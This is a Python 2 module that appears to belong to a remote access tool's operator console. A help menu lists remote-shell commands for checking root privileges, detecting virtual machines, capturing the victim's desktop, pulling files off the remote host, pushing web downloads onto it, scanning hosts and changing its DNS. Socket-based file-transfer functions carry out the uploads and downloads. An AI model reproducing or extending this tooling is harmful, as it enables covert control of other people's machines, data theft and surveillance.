import sys

from basic_modules import *

def help(search):
	help_list = {}
	help_list["background"] = "Run the shell into background and use framework"
	help_list["check_priv"] = "Check if remote script has root priviledges"
	help_list["rshell"] = "Activate Free Remote Command Line"
	help_list["cshell"] = "Deactivate Free Remote Command Line ( Available when rshell is )"
	help_list["sysinfo"] = "Display Remote System Information"
	help_list["exec"] = "Execute Argument As Command On Remote Host"
	help_list['cls'] = "Clears The Terminal. Same function as 'clear'."
	help_list['encryption'] = "Enable Encryption For Data Sent"
	help_list['help'] = "Prints this help message"
	help_list['lookup'] = "Search files on Remote Host"
	help_list['retrieve'] = "Download files from Remote Host"
	help_list['check_vm'] = "Checks if The Remote System Is A Virtual Machine"
	help_list['cd'] = "Change the Shell Directory"
	help_list['kill'] = "Stop Remote Shell"
	help_list['download'] = "Download files from the Web unto the Remote Machine"
	help_list['sys_users'] = "Get Information About System Users"
	help_list['ls'] = "List Directory Contents"
	help_list['cat'] = "Read File Content"
	help_list['pwd'] = "Print Working Directory"
	help_list['send'] = "Send files to Remote Host"
	help_list['rm'] = "Delete files from Remote Disk"
	help_list['screenshot'] = "Capture Remote Host Desktop"
	help_list['interfaces'] = "Get Remote Network Interface. Accepts no argument"
	help_list['terminate'] = "Terminate A Process On The Remote Host Using Signals"
	help_list['ps'] = "List Processes On Remote Host Using Native ps command. Other arguments are accepted. Default is ( aux )."
	help_list['host-scanner'] = "Scan a specified machine from Remote Host"
	help_list['dnsch'] = "DNS Changer. Accepts an argument of addresses seperated by a comma."
	help_list['devices'] = "Get Mounted Devices On Remote Machine"

	results = ""

	if len(search) != 0 and help_list.has_key(search):
		results += " " + colors("lg", "="*80,1,1)
		results += " " + colors("green",search) + " - " + colors("blue",help_list[search],0,1)
		results += " " + colors("lg", "="*80,0,1)
	elif len(search) != 0 and help_list.has_key(search) == False:
		results += " " + colors("lg", "="*80,1,1)
		results += " " + colors("error", "Unknown help command - " + search,0,1)
		results += " " + colors("lg", "="*80 ,0, 1)
	else:
		for x in sorted(help_list):
			results += " " + colors("green",x) + " - " + colors("blue",help_list[x],0,1)

	return results

def retrieve_encryption_buffer_size(code):
	b_size = 0
	
	if code == 0:
		b_size = 36
	elif code == 1:
		b_size = 2048
	elif code == 2:
		b_size = 65535

	return b_size

def send_file_over(connection, filename, top):
	total_bytes_to_receive = int(top)
	print colors("g", " [+] ") + colors("b", "Transferring %s Over To Remote Host" % (human_readable(int(total_bytes_to_receive))))

	with open(filename, 'rb') as stream:
		p = retrieve_encryption_buffer_size(2)
		data = stream.read(p)
		connection.send(data)
		total_bytes = len(data)
		
		prog_perct = 20

		equ = int(float(float(total_bytes) / float(total_bytes_to_receive)) * prog_perct)
		sys.stdout.write("\r" + colors("g"," [+] ") + colors("b", 
				"Progress: [ " + progress_format(equ,prog_perct) + " ] " + 
				str(int(float(float(total_bytes) / float(total_bytes_to_receive)) * 100)) + " %"))
		sys.stdout.flush()

		while total_bytes < total_bytes_to_receive and len(data) != 0:
			data = stream.read(p)
			connection.send(data)
			total_bytes += len(data)
			equ = int(float(float(total_bytes) / float(total_bytes_to_receive)) * prog_perct)

			sys.stdout.write("\r" + colors("g"," [+] ") + colors("b", 
				"Progress: [ " + progress_format(equ,prog_perct) + " ] " + 
				str(int(float(float(total_bytes) / float(total_bytes_to_receive)) * 100)) + " %"))
			sys.stdout.flush()
		print "\n"

def human_readable(bytes):
	abbrevs = (
		(1<<50L, 'PB ( PettaBytes )'),
		(1<<40L, 'TB ( TerraBytes )'),
		(1<<30L, 'GB ( GigaBytes )'),
		(1<<20L, 'MB ( MegaBytes )'),
		(1<<10L, 'KB ( KiloBytes )'),
		(1, 'B ( Bytes )')
		)
	if bytes == 1:
		return "1 Byte"
	for factor, suffix in abbrevs:
		if bytes >= factor:
			break
	return "%.1f %s" % (bytes / factor, suffix)

def initiate_individual_file_transfer(connection, f_count, base_x):
	while 1:
		while 1:
			data = connection.recv(2048).lstrip("0")

			data = data.split("#")
			byte = data[0]
			filename = data[1]

			local_path = str(base_x + filename).replace("//", "/")

			print local_path

			with open(local_path, "wb") as stream_writer:
				total_bytes_to_receive = byte
				p = retrieve_encryption_buffer_size(1)
				data = connection.recv(p)

				if data == "<OK>":
					break
				
				stream_writer.write(data)
				total_bytes = len(data)

				while total_bytes < total_bytes_to_receive and len(data) != 0: 
					data = connection.recv(p)
					if data == "<OK>":
						break
					stream_writer.write(data)
					total_bytes += len(data)
			print "Done"

def initiate_file_transfer(connection, bytes,filename, base_x):
	filename = base_x + filename.split("/")[-1]

	print colors("g","\n [+]") + colors("b"," Initiating File Transfer ...") 
	print colors("g"," [+]") + colors("b"," Filesize: %s " % (human_readable(int(bytes))))
	print colors("g"," [+]") + colors("b"," Saving as: %s" % (filename)) 

	with open(filename, "wb") as file_handler: 
		total_bytes_to_receive = long(bytes) 
		p = retrieve_encryption_buffer_size(1)
		data = connection.recv(p)
		file_handler.write(data)
		total_bytes = len(data)

		prog_perct = 20

		equ = int(float(float(total_bytes) / float(total_bytes_to_receive)) * prog_perct)
		sys.stdout.write("\r" + colors("g"," [+] ") + colors("b", 
				"Progress: [ " + progress_format(equ,prog_perct) + " ] " + 
				str(int(float(float(total_bytes) / float(total_bytes_to_receive)) * 100)) + " %"))

		while total_bytes < total_bytes_to_receive and len(data) != 0: 
			data = connection.recv(p)
			file_handler.write(data)
			total_bytes += len(data)
			equ = int(float(float(total_bytes) / float(total_bytes_to_receive)) * prog_perct) 

			sys.stdout.write("\r" + colors("g"," [+] ") + colors("b", 
				"Progress: [ " + progress_format(equ,prog_perct) + " ] " + 
				str(int(float(float(total_bytes) / float(total_bytes_to_receive)) * 100)) + " %"))
			sys.stdout.flush()

		print colors("g","\n [+]") + colors("b"," File Transfer Complete.\n")

def progress_format(equ, prog_perct, s="="): 
	x = s * equ 
	x += ' ' * (prog_perct - (len(x) % prog_perct)) 

	if equ == prog_perct: 
		x = x.strip() 
	return x